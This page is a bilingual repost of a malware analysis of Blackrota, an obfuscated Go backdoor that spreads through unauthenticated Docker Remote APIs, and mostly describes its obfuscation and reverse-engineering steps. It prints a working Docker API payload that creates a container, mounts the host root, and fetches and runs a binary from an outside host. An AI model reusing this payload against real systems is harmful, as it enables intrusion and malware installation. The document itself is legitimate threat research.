<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Blackrota，一个用Go语言编写的高度混淆的后门Blackrota, a heavily obfuscated backdoor written in Go</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Blackrota, a heavily obfuscated backdoor written in Go<br/>Blackrota，一个用Go语言编写的高度混淆的后门</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-11-28 02:06:24</div><div class="page_narrow text-break page_content"><p>Recently, a malicious backdoor program written in the Go language that exploits an unauthorized access vulnerability in the Docker Remote API was caught by the our  Anglerfish honeypot. We named it  Blackrota, given that its C2 domain name is  blackrota.ga .</p><p>最近，我们的Anglerfish蜜罐发现了用Go语言编写的恶意后门程序，该程序利用Docker Remote API中的未授权访问漏洞。我们将其命名为Blackrota，因为其C2域名为blackrota.ga。</p><p> The  Blackrota backdoor is currently only available for Linux, in ELF file format, and supports both x86/x86-64 CPU architectures. Blackrota is configured and compiled based on   geacon, a CobaltStrike Beacon implemented in the Go language, which can be used as a CobalStrike Beacon that interacts with CobaltStrike to control compromised hosts:</p><p> Blackrota后门目前仅适用于Linux（ELF文件格式），并且支持x86 / x86-64 CPU架构。 Blackrota是基于geacon（以Go语言实现的CobaltStrike信标）配置和编译的，它可用作与CobaltStrike交互以控制受感染主机的CobalStrike信标：</p><p>    Unlike the original  geacon,  Blackrota uses   gobfuscate to obfuscate the source code before compiling.  gobfuscate is an open-source tool for Go code obfuscation, which can obfuscate the following elements of Go source code with random character substitutions:</p><p>    与原始geacon不同，Blackrota在编译之前使用gobfuscate对源代码进行模糊处理。 gobfuscate是用于Go代码混淆的开源工具，它可以使用随机字符替换来混淆Go源代码的以下元素：</p><p>  In addition, gobfuscate replaces all strings used in the code with XOR encodings, assigning each string an XOR Decoding function that dynamically decodes strings during program execution.</p><p>  此外，gobfuscate会将代码中使用的所有字符串替换为XOR编码，并为每个字符串分配一个XOR Decoding函数，该函数可在程序执行期间动态解码字符串。</p><p> The Go language uses fully static links to build binary files. As a result, all the codes used in standard and third-party libraries are packed into binary files, resulting in very large binary files. This characteristic, from a reverse analysis point of view, means that when you open a Go binary file in a disassembly tool, you will see thousands or even tens of thousands of functions. If these functions don&#39;t have corresponding symbolics, it will be difficult to reverse-analyze Go binary files.</p><p> Go语言使用完全静态的链接来构建二进制文件。结果，标准库和第三方库中使用的所有代码都打包到二进制文件中，从而导致非常大的二进制文件。从反向分析的角度来看，此特性意味着在反汇编工具中打开Go二进制文件时，将看到成千上万个函数。如果这些函数没有相应的符号，则将很难对Go二进制文件进行反向分析。</p><p> The good news is that the Go language has another mechanism: when building a binary, both the  RTSI(Runtime Symbol Information) and the  RTTI(Runtime Type Information) are packed into the binary and cannot be stripped. Currently, almost all the dedicated tools to help reverse engineering Go binaries try to recover those information from Go binaries to assist analyse process. Go projects often import many third-party open-source packages. Genrally, the recovered  RTSI and  RTTI will lead us to the corresponding open-source package, we can then read the source code of third-party packages, which will further increase the efficiency of reverse analysis.</p><p> 好消息是Go语言还有另一种机制：构建二进制文件时，RTSI（运行时符号信息）和RTTI（运行时类型信息）都打包到二进制文件中，不能剥离。当前，几乎所有用于逆向工程Go二进制文件的专用工具都试图从Go二进制文件中恢复那些信息以协助分析过程。 Go项目通常会导入许多第三方开源软件包。通常，恢复的RTSI和RTTI会将我们引向相应的开源程序包，然后我们可以阅读第三方程序包的源代码，这将进一步提高反向分析的效率。</p><p> Blackrota uses  gobfuscate to obfuscate symbolic and type information, which is the &#34;life-door&#34; of such reverse-analysis tools. The symbolic information they parse and recover becomes unreadable, and it is not possible to make sense of the symbolic and type information, and it is not possible to know which third-party packages were imported to the project. This makes the reverse analysis process a lot more difficult.</p><p> Blackrota使用gobfuscate来混淆符号和类型信息，这是此类反向分析工具的“生命之门”。它们解析和恢复的符号信息变得不可读，并且无法理解符号和类型信息，并且无法知道哪些第三方程序包已导入到项目中。这使反向分析过程变得更加困难。</p><p> Historically, we have seen malware written in Go that was at best stripped at compiling time, and at worst slightly obfuscated, without much difficulty in reverse analysis. Blackrota brings a new approach to obfuscation, and is the most obfuscated Go-written malware in ELF format that we have found to date.</p><p>从历史上看，我们已经看到用Go语言编写的恶意软件在编译时充其量是最好的，在最坏的情况下它会被模糊处理，在反向分析中没有太多困难。 Blackrota带来了一种新的混淆方法，它是迄今为止我们发现的最混淆的ELF格式的Go编写恶意软件。</p><p>   The author of  Blackrato recruits multiple payloads for unauthorized use of the Docker Remote API. A typical payload is simplified as follows:</p><p>   Blackrato的作者招募了多个有效载荷，用于未经授权使用Docker Remote API。典型的有效负载简化如下：</p><p> POST /v1.37/containers/create HTTP/1.1Host: {target_host}:{target_port}User-Agent: Docker-Client/19.03.7 (linux)Content-Length: 1687Content-Type: application/json{&#34;Env&#34;:[],&#34;Cmd&#34;:[&#34;/bin/sh&#34;,&#34;-c&#34;,&#34;rm ./32 ; wget https://semantixpublic.s3.amazonaws.com/itau-poc-elastic/32;chmod 777 32; nohup ./32 \u003c/dev/null \u003e/dev/null 2\u003e\u00261 \u0026&#34;],&#34;Image&#34;:&#34;alpine&#34;,&#34;Volumes&#34;:{},&#34;WorkingDir&#34;:&#34;&#34;,&#34;HostConfig&#34;:{&#34;Binds&#34;:[&#34;/:/mnt&#34;]}</p><p> POST /v1.37/containers/create HTTP / 1.1Host：{target_host}：{target_port} User-Agent：Docker-Client / 19.03.7（linux）Content-Length：1687Content-Type：application / json {“ Env” ：[]，“ Cmd”：[“ / bin / sh”，“-c”，“ rm ./32; wget https://semantixpublic.s3.amazonaws.com/itau-poc-elastic/32;chmod 777 32; nohup ./32 \ u003c / dev / null \ u003e / dev / null 2 \ u003e \ u00261 \ u0026“]，” Image“：” alpine“，” Volumes“：{}，” WorkingDir“：”“， “ HostConfig”：{“ Binds”：[“ /：/ mnt”]}</p><p> With a successful payload, the 32bit or 64bit Blackrota backdoor program will be downloaded from the following 2 URLs:</p><p> 成功加载有效负载后，将从以下2个URL下载32位或64位Blackrota后门程序：</p><p>   As described above, Blackrota backdoor program was written in Go language, with the help of our   go_parser in IDAPro, we can tell it was compiled from  Go1.15.3, with  GOROOT path  &#34;/usr/local/Cellar/ go/1.15.3/libexec&#34;.In addition to these two valid pieces of information, the parsed source file paths, function names, global variable names, data type names, and method names bound to datat ypes are all obfuscated with random character substitutions and are unreadable.</p><p>   如上所述，Blackrota后门程序是用Go语言编写的，借助于IDAPro中的go_parser，我们可以知道它是从Go1.15.3编译的，GOROOT路径为“ / usr / local / Cellar / go / 1.15.3 / libexec”。除了这两条有效信息外，解析的源文件路径，函数名称，全局变量名称，数据类型名称和绑定到数据类型的方法名称都被随机字符替换所混淆，并且不可读。</p><p> We can see the source file path list involved in the project (the directory of the source file is named with a random string):</p><p> 我们可以看到项目中涉及的源文件路径列表（源文件的目录以随机字符串命名）：</p><p>   From the above parsing results, the biggest obstacle to reverse analysis is that the function names, type names, and method names are obfuscated into meaningless random characters in the source code of the third-party packages imported from the  Blackrota sample. Partial list of functions after parsing:</p><p>   从以上分析结果来看，进行反向分析的最大障碍是，在从Blackrota示例导入的第三方程序包的源代码中，函数名称，类型名称和方法名称被混淆为无意义的随机字符。解析后的部分函数列表：</p><p>    In addition, there are still some method names bound to data types that are not completely obfuscated:</p><p>此外，还有一些绑定到数据类型的方法名称并没有完全混淆：</p><p>  With thousands of random string-named functions and a large number of randomly-named data types, methods, and global variables, we could not be sure what third-party Go packages were used inside the sample, making the reverse analysis almost impossible to move forward. Eventually, after some careful analysis, we discovered that the Blackrota sample was compiled from  geacon.</p><p>  由于具有成千上万个随机字符串命名的函数以及大量随机命名的数据类型，方法和全局变量，我们无法确定样本中使用了哪些第三方Go软件包，因此几乎无法进行反向分析前锋。最终，经过仔细的分析，我们发现Blackrota样本是从geacon编译而来的。</p><p> In this way, we can try to recover the function symbols in the  Blackrota sample using the following steps.</p><p> 这样，我们可以尝试使用以下步骤恢复Blackrota示例中的功能符号。</p><p> Compile a geacon binary with the same CPU architecture as the Blackrota sample, without stripped;</p><p> 编译具有与Blackrota示例相同的CPU体系结构的geacon二进制文件，而不进行剥离；</p><p>  Use the  sigmake in Flair Tools set to create a Flirt Signature file for geacon ( geacon.sig).</p><p>  使用Flair工具集中的sigmake为geacon创建一个Flirt签名文件（geacon.sig）。</p><p> Progress made! But don&#39;t get too excited yet, because we found out that  Blackrota&#39;s function symbols are not completely recognized, and there are about a hundred functions that are not covered by geacon&#39;s symbols, some of which are recognized as follows:</p><p> 进步了！但是不要太激动，因为我们发现Blackrota的功能符号还没有被完全识别，并且有大约一百个功能没有被geacon的符号覆盖，其中一些识别如下：</p><p>   In the analysis above, we saw that only a very few of the strings used in the Go standard packages are parsed in  Blackrota, while the strings inside  geacon are not parsed. The problem lies in the functions above that are not covered by the geacon symbol.</p><p>   在上面的分析中，我们看到在Blackrota中仅解析了Go标准软件包中使用的很少的字符串，而没有解析geacon内部的字符串。问题在于上述功能没有被geacon符号覆盖。</p><p> From our analysis, we see that  Blackrota XOR-encodes all the strings it uses internally, and dynamically decodes the strings at runtime to refer back to them. For each string, there is an XOR decoder function.  gobfuscate generates a random XOR key of the same length as the string, solves a string of characters and returns it, and the solved string is referenced in the parent function. One of the key parts of the XOR decoding function is shown in the following figure:</p><p>从我们的分析中，我们看到Blackrota对它内部使用的所有字符串进行XOR编码，并在运行时动态解码这些字符串以引用它们。对于每个字符串，都有一个XOR解码器功能。 gobfuscate生成与字符串长度相同的随机XOR密钥，求解字符串并返回它，并且已解决的字符串在父函数中引用。下图显示了XOR解码功能的关键部分之一：</p><p>  If we want to decode all the strings, we need to find each string encoding function, find the Encoded Bytes and XOR Key, and solve the strings using the XOR algorithm. This will increase a lot of work to the reverse analysis effort, and also help the program to avoid the automated detection of security products to some extent.</p><p>  如果要解码所有字符串，则需要找到每个字符串编码函数，找到“编码字节”和“ XOR键”，然后使用XOR算法求解字符串。这将为反向分析工作增加很多工作，也有助于程序在某种程度上避免自动检测安全产品。</p><p>  Obfuscated malware written in Go is rare, except for a few simple attempts by white hats, but only two have been seen before: one is the ransomeware exposed by  @joakimkennedy that only obfuscates function symbols in  package main:</p><p>  用Go语言编写的经过混淆的恶意软件很少见，除了白帽子进行的几次简单尝试之外，但以前只见过两次：一种是@joakimkennedy公开的勒索软件，它仅对包main中的功能符号进行了混淆：</p><p>  That program simply obfuscates the names of a few functions in the main package and hardly causes any issue to the reverse analysis:</p><p>  该程序只是混淆了主程序包中几个函数的名称，几乎不会引起反向分析的任何问题：</p><p>  The other one is another ransomeware   EKANS, which uses the same obfuscation method as Blackrota:</p><p>  另一个是另一种勒索软件EKANS，它使用与Blackrota相同的混淆方法：</p><p>  The obfuscation method of Blackrota and EKANS creates new challenges for reverse analysis. As the Go language becomes more popular, more and more malware will be written in Go in the future, we will keep an eye on what is going to happen.</p><p>  Blackrota和EKANS的混淆方法为反向分析提出了新的挑战。随着Go语言变得越来越流行，将来将越来越多的Go语言编写恶意软件，我们将密切关注即将发生的事情。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/">https://blog.netlab.360.com/blackrota-an-obfuscated-backdoor-written-in-go-en/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/编写/">#编写</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/heavily/">#heavily</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/blackrota/">#blackrota</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>